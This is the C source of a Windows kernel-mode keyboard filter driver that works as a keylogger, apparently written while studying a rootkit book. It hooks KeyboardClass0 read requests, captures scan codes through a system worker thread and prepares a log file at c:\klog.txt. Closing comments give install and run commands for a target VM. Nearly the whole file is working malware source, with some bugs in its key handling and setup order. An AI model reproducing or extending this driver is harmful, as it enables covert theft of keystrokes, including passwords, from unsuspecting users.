#pragma warning(disable : 4100)
#pragma warning(disable : 4242)
#pragma warning(disable : 4244)
#pragma warning(disable : 4459)
#pragma warning(disable : 4267)
#pragma warning(disable : 4047)
#pragma warning(disable : 4024)

#include <ntddk.h>
#include <ntstrsafe.h>
#include "ntddkbd.h"
#include "source.h"
#include "scancode.h"

UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\kbdDevice");                    // ADDED
UNICODE_STRING SymLinkName = RTL_CONSTANT_STRING(L"\\??\\kbdDeviceLink");                   // ADDED
PDEVICE_OBJECT DeviceObject = NULL;                                                         // ADDED

PDEVICE_OBJECT pKeyboardDeviceObject = NULL;
ULONG pendingkey = 0;
typedef BOOLEAN bool;





VOID GetKey(char* buf, USHORT makecode)
{
    switch (makecode)
    {
    case 0x01: strcpy(buf, "ESC"); break;
    case 0x02: strcpy(buf, "1"); break;
    case 0x03: strcpy(buf, "2"); break;
    case 0x04: strcpy(buf, "3"); break;
    case 0x05: strcpy(buf, "4"); break;
    case 0x06: strcpy(buf, "5"); break;
    case 0x07: strcpy(buf, "6"); break;
    case 0x08: strcpy(buf, "7"); break;
    case 0x09: strcpy(buf, "8"); break;
    case 0x0A: strcpy(buf, "9"); break;
    case 0x0B: strcpy(buf, "0"); break;
    case 0x0C: strcpy(buf, "-"); break;
    case 0x0D: strcpy(buf, "="); break;
    case 0x0E: strcpy(buf, "BKS"); break;
    case 0x0F: strcpy(buf, "TAB"); break;
    case 0x10: strcpy(buf, "q"); break;
    case 0x11: strcpy(buf, "w"); break;
    case 0x12: strcpy(buf, "e"); break;
    case 0x13: strcpy(buf, "r"); break;
    case 0x14: strcpy(buf, "t"); break;
    case 0x15: strcpy(buf, "y"); break;
    case 0x16: strcpy(buf, "u"); break;
    case 0x17: strcpy(buf, "i"); break;
    case 0x18: strcpy(buf, "o"); break;
    case 0x19: strcpy(buf, "p"); break;
    case 0x1A: strcpy(buf, "["); break;
    case 0x1B: strcpy(buf, "]"); break;
    case 0x1C: strcpy(buf, "ENT"); break;
    case 0x1D: strcpy(buf, "RCTRL"); break;
    case 0x1E: strcpy(buf, "a"); break;
    case 0x1F: strcpy(buf, "s"); break;    
    case 0x20: strcpy(buf, "d"); break;
    case 0x21: strcpy(buf, "f"); break;
    case 0x22: strcpy(buf, "g"); break;
    case 0x23: strcpy(buf, "h"); break;
    case 0x24: strcpy(buf, "j"); break;
    case 0x25: strcpy(buf, "k"); break;
    case 0x26: strcpy(buf, "l"); break;
    case 0x27: strcpy(buf, ";"); break;
    case 0x28: strcpy(buf, "'"); break;
    case 0x29: strcpy(buf, "UNK"); break;
    case 0x2A: strcpy(buf, "LSHFT"); break;
    case 0x2B: strcpy(buf, "\\"); break;
    case 0x2C: strcpy(buf, "z"); break;
    case 0x2D: strcpy(buf, "x"); break;
    case 0x2E: strcpy(buf, "c"); break;
    case 0x2F: strcpy(buf, "v"); break;
    case 0x30: strcpy(buf, "b"); break;
    case 0x31: strcpy(buf, "n"); break;
    case 0x32: strcpy(buf, "m"); break;
    case 0x33: strcpy(buf, ","); break;
    case 0x34: strcpy(buf, "."); break;
    case 0x35: strcpy(buf, "/"); break;
    case 0x36: strcpy(buf, "RSHFT"); break;
    case 0x37: strcpy(buf, "NYI"); break;
    case 0x38: strcpy(buf, "RALT"); break;
    case 0x39: strcpy(buf, "SPACE"); break;
    case 0x3A: strcpy(buf, "NYI"); break;
    case 0x3B: strcpy(buf, "NYI"); break;
    case 0x3C: strcpy(buf, "NYI"); break;
    case 0x3D: strcpy(buf, "RCTRL"); break;

    default: strcpy(buf, "NYI");  break;
    }
}

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject)
{    
    LARGE_INTEGER interval = { 0 };
    PDEVICE_OBJECT DeviceObject = DriverObject->DeviceObject;
    interval.QuadPart = -10 * 1000 * 1000;
    IoDetachDevice(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->pKeyboardDevice);

    while (pendingkey)
    {
        KeDelayExecutionThread(KernelMode, FALSE, &interval);
    }

    IoDeleteSymbolicLink(&SymLinkName);                                                     // ADDED
    IoDeleteDevice(pKeyboardDeviceObject);
    DbgPrint("[*] Driver Unload");
}

NTSTATUS DispatchPass(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    PIO_STACK_LOCATION irpsp = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;

    // If CREATE or CLOSE, then handle IRP; else send ToNext then IoCallDriver(pKeyboardDevice) and give it IRP
    switch (irpsp->MajorFunction)
    {
    case IRP_MJ_CREATE:
        DbgPrint("[*] IRP_MJ_CREATE Request");
        Irp->IoStatus.Information = 0;
        Irp->IoStatus.Status = status;
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
        break;
    case IRP_MJ_CLOSE:
        DbgPrint("[*] IRP_MJ_CLOSE Request");
        Irp->IoStatus.Information = 0;
        Irp->IoStatus.Status = status;
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
        break;
    default:
        // Get IRP Stack Location
        IoCopyCurrentIrpStackLocationToNext(Irp);

        return IoCallDriver(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->pKeyboardDevice, Irp);
        break;
    }

    return status;
}

// CompletionRoutine for IoSetCompletionRoutine();
NTSTATUS ReadComplete(PDEVICE_OBJECT pDeviceObject, PIRP Irp, PVOID Context)
{
    CHAR* keyflag[4] = {"KeyDown","KeyUp","E0","E1"};

    PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject -> DeviceExtension;
    PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
    int structnum = Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);     // bytes written


    
    if (Irp->IoStatus.Status == STATUS_SUCCESS)
    {
        char buf[64] = { 0 };

        for (int i = 0; i < structnum; i++)
        {
            if (strcmp(keyflag[keys[i].Flags], "KeyDown"))
            {
                GetKey(buf, keys[i].MakeCode);
                DbgPrint("Key: %s (0x%x)\n", buf, keys[i].MakeCode);

                // Initialize kData
                KEY_DATA* kData = (KEY_DATA*)ExAllocatePool(NonPagedPool, sizeof(KEY_DATA));;

                // Fill in kData structure with info from IRP.
                kData->KeyData = (char)keys[i].MakeCode;
                kData->KeyFlags = (char)keys[i].Flags;

                // Add the scan code to the linked list queue so our worker thread can write it out to a file.
                DbgPrint("Adding IRP to work queue..."); 

                ExInterlockedInsertTailList(&pKeyboardDeviceExtension->QueueListHead, &kData->ListEntry, &pKeyboardDeviceExtension->lockQueue);

                KeReleaseSemaphore(&pKeyboardDeviceExtension->semQueue, 0, 1, FALSE);
            } 
        }
            

        RtlZeroMemory(buf, 64);
    }

    if (Irp->PendingReturned)
    {
        IoMarkIrpPending(Irp);
    }

    // Decrease pendingkey counter
    pendingkey--;

    return Irp->IoStatus.Status;
}

NTSTATUS DispatchRead(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{    
    IoCopyCurrentIrpStackLocationToNext(Irp);

    // Intercepts IRP Read Requests that are returned from the physical device
    IoSetCompletionRoutine(Irp, ReadComplete, NULL, TRUE, TRUE, TRUE); 

    // Increase pendingkey counter
    pendingkey++;

    return IoCallDriver(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->pKeyboardDevice, Irp);
}

NTSTATUS MyAttachDevice(IN PDRIVER_OBJECT DriverObject)
{
    NTSTATUS status;
    UNICODE_STRING uKeyboardDeviceName = RTL_CONSTANT_STRING(L"\\Device\\KeyboardClass0");

    status = IoCreateDevice(DriverObject, sizeof(DEVICE_EXTENSION), &DeviceName, FILE_DEVICE_KEYBOARD, 0, TRUE, &pKeyboardDeviceObject);

    if (!NT_SUCCESS(status))
    {
        DbgPrint("[!] IoCreateDevice Failed!\n");
        IoDeleteDevice(DeviceObject);
        return status;
    }        

    pKeyboardDeviceObject->Flags |= DO_BUFFERED_IO;
    pKeyboardDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

    RtlZeroMemory(pKeyboardDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));

    // #TODO - get device extention pointer - ROOTKIT Book, page 143 (top of page)

    // AttachDevice to Keyboard0
    status = IoAttachDevice(pKeyboardDeviceObject, &uKeyboardDeviceName, &((PDEVICE_EXTENSION)pKeyboardDeviceObject->DeviceExtension)->pKeyboardDevice);

    RtlFreeUnicodeString(&uKeyboardDeviceName);

    if (!NT_SUCCESS(status))
    {
        IoDeleteDevice(pKeyboardDeviceObject);
        DbgPrint("[!] IoAttachDevice Failed!\n");
        return status;
    } 

    // Symlink allows user applications to access our device
    status = IoCreateSymbolicLink(&SymLinkName, &DeviceName);

    if (!NT_SUCCESS(status))
    {
        DbgPrint("[!] IoCreateSymbolicLink Failed!\n");
        IoDeleteDevice(DeviceObject);
        return status;
    }

    return STATUS_SUCCESS;

}

VOID ThreadKeyLogger(IN PVOID pContext)
{
    PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pContext;
    PDEVICE_OBJECT pKeyboardDeviceObject = pKeyboardDeviceExtension->pKeyboardDevice;
    PLIST_ENTRY pListEntry;
    KEY_DATA* kData;
    char keys[64] = { 0 };

    while (TRUE)
    {
        // Wait for data to become available in queue
        KeWaitForSingleObject(&pKeyboardDeviceExtension->semQueue, Executive, KernelMode, FALSE, NULL);

        pListEntry = ExInterlockedRemoveHeadList(&pKeyboardDeviceExtension->QueueListHead, &pKeyboardDeviceExtension->lockQueue);

        if (pKeyboardDeviceExtension->bThreadTerminate == TRUE)
        {
            PsTerminateSystemThread(STATUS_SUCCESS);
        }

        kData = CONTAINING_RECORD(pListEntry, KEY_DATA, ListEntry);

        ConvertScanCodeToKeyCode(pKeyboardDeviceExtension, kData, keys);
    }
}

NTSTATUS InitThreadKeyLogger(IN PDRIVER_OBJECT pDriverObject)
{
    PDEVICE_EXTENSION pKeyboardDeviceExtention = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;

    // Create Worker Thread
    HANDLE hThread;
    NTSTATUS status = PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, ThreadKeyLogger, pKeyboardDeviceExtention);

    if (!NT_SUCCESS(status))
    {
        DbgPrint("[!] PsCreateSystemThread Failed");
        return status;        
    }

    // Obtain a pointer to the thread object
    ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, NULL, KernelMode, (PVOID*)&pKeyboardDeviceExtention->pThreadObj, NULL);

    ZwClose(hThread);
    return status;
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING RegistryPath)
{
    NTSTATUS status;

    pDriverObject->DriverUnload = DriverUnload;

    // Iterate through IRP Functions
    for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
    {
        // DispatchPassThru will handle IRP Major Functions
        pDriverObject->MajorFunction[i] = DispatchPass;
    }

    pDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;
        
    status = MyAttachDevice(pDriverObject);

    if (!NT_SUCCESS(status))
    {        
        DbgPrint("[!] MyAttachedDevice Failed");
        return status;
    }

    InitThreadKeyLogger(pDriverObject);

    // Initialize a shared link list queue
    PDEVICE_EXTENSION pKeyboardDeviceExtention = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
    InitializeListHead(&pKeyboardDeviceExtention->QueueListHead);

    // Initialize the lock for the linked list queue; this protects two threads from accessing the same list, which leads to BSOD
    KeInitializeSpinLock(&pKeyboardDeviceExtention->lockQueue);
    
    // Initialize the work queue symaphore; this protects two threads from accessing the same list, which leads to BSOD
    KeInitializeSemaphore(&pKeyboardDeviceExtention->semQueue, 0, MAXLONG);

    // Create the log file
    IO_STATUS_BLOCK file_status;
    OBJECT_ATTRIBUTES obj_attrib;
    CCHAR ntNameFile[64] = "\\DosDevices\\c:\\klog.txt";
    STRING ntNameString;
    UNICODE_STRING uFileName;
    RtlInitAnsiString(&ntNameString, ntNameFile);
    RtlAnsiStringToUnicodeString(&uFileName, &ntNameString, TRUE);
    InitializeObjectAttributes(&obj_attrib, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = ZwCreateFile(&pKeyboardDeviceExtention->hLogFile, GENERIC_WRITE, &obj_attrib, &file_status, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    RtlFreeUnicodeString(&uFileName);

    if (status != STATUS_SUCCESS)
    {
        DbgPrint("[!] Failed to create log file...\n");
        DbgPrint("File Status = %x\n", file_status);
    }
    else
    {
        DbgPrint("Successfully created log file...\n");
        DbgPrint("File Handle = %x\n", pKeyboardDeviceExtention->hLogFile);
    }

    DbgPrint("[*] DriverEntry Completed Successfully");
    return status;
}

/*  TO INSTALL:
*   1) copy to Target VM
*   2) c:\> sc create kbd binpath= "C:\{path}\kbd.sys" type= kernel start= demand
*
*   TO RUN/STOP:
*   1) sc start kbd
*   2) sc stop kbd
*
*   MISC:
*   Disable Error Messages with:
*       #pragma warning(disable : 4100)
*/